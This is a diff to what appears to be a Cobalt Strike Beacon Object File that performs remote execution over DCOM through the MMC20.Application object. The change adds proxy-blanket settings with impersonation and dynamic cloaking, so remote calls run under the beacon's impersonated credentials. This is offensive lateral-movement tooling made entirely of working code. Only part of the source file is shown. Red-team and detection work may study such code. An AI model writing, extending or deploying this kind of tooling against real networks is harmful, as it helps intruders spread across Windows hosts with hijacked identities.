@@ -4,6 +4,7 @@
 #include <windows.h>
 
 #include "beacon.h"
+#include "com.h"
 #include "rex.h"
 #include "technique.h"
 
@@ -15,6 +16,10 @@ DECLSPEC_IMPORT void WINAPI OLE32$CoUninitialize(void);
 DECLSPEC_IMPORT HRESULT WINAPI OLE32$CoCreateInstanceEx(REFCLSID, IUnknown *,
                                                         DWORD, COSERVERINFO *,
                                                         DWORD, MULTI_QI *);
+DECLSPEC_IMPORT HRESULT WINAPI OLE32$CoSetProxyBlanket(IUnknown *, DWORD, DWORD,
+                                                       OLECHAR *, DWORD, DWORD,
+                                                       RPC_AUTH_IDENTITY_HANDLE,
+                                                       DWORD);
 DECLSPEC_IMPORT HRESULT WINAPI OLE32$CoEnableCallCancellation(LPVOID);
 DECLSPEC_IMPORT HRESULT WINAPI OLE32$CoDisableCallCancellation(LPVOID);
 DECLSPEC_IMPORT HRESULT WINAPI OLE32$CoCancelCall(DWORD, DWORD);
@@ -62,6 +67,14 @@ typedef struct {
     HRESULT result;
 } rex_mmc20_state;
 
+static HRESULT rex_mmc20_proxy(IDispatch *dispatch) {
+    return OLE32$CoSetProxyBlanket(
+        (IUnknown *)dispatch, RPC_C_AUTHN_DEFAULT, RPC_C_AUTHZ_DEFAULT,
+        COLE_DEFAULT_PRINCIPAL, RPC_C_AUTHN_LEVEL_DEFAULT,
+        RPC_C_IMP_LEVEL_IMPERSONATE, COLE_DEFAULT_AUTHINFO,
+        EOAC_DYNAMIC_CLOAKING);
+}
+
 static HRESULT rex_mmc20_dispatch_id(IDispatch *dispatch, const wchar_t *name,
                                      DISPID *id) {
     LPOLESTR names[1];
@@ -102,6 +115,8 @@ static HRESULT rex_mmc20_dispatch_result(IDispatch *source, const wchar_t *name,
         }
     }
     OLEAUT32$VariantClear(&value);
+    if (SUCCEEDED(result))
+        result = rex_mmc20_proxy(*output);
     return result;
 }
 
@@ -152,6 +167,9 @@ static DWORD WINAPI rex_mmc20_worker(LPVOID parameter) {
         KERNEL32$SetEvent(state->ready_event);
         return 0;
     }
+    result = rex_com_enable_dynamic_cloaking();
+    if (FAILED(result))
+        goto cleanup;
     result = OLE32$CoEnableCallCancellation(NULL);
     if (FAILED(result))
         goto cleanup;
@@ -171,6 +189,9 @@ static DWORD WINAPI rex_mmc20_worker(LPVOID parameter) {
         goto cleanup;
     }
     application = (IDispatch *)query.pItf;
+    result = rex_mmc20_proxy(application);
+    if (FAILED(result))
+        goto cleanup;
     result = rex_mmc20_dispatch_result(application, L"Document", &document);
     if (FAILED(result))
         goto cleanup;
